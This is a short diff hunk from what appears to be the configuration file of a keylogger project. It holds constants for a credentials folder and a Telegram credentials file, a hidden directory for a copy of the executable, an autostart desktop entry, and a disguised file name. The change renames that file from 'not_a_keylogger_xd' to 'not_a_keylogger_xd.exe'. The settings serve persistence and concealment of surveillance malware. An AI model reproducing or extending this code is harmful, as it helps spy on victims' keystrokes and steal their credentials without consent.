@@ -9,7 +9,7 @@ CREDENTIAL_DIR = 'keylogger/credentials/'
 CREDENTIAL_FILE_TELEGRAM = 'credentials_telegram.json'
 
 DUPLICATE_EXE_DIR = '~/.var/xah/'
-DUPLICATE_NAME_FILE = 'not_a_keylogger_xd'
+DUPLICATE_NAME_FILE = 'not_a_keylogger_xd.exe'
 
 AUTOSTART_DIR = '~/.config/autostart/'
 AUTOSTART_CONTENT = """[Desktop Entry]
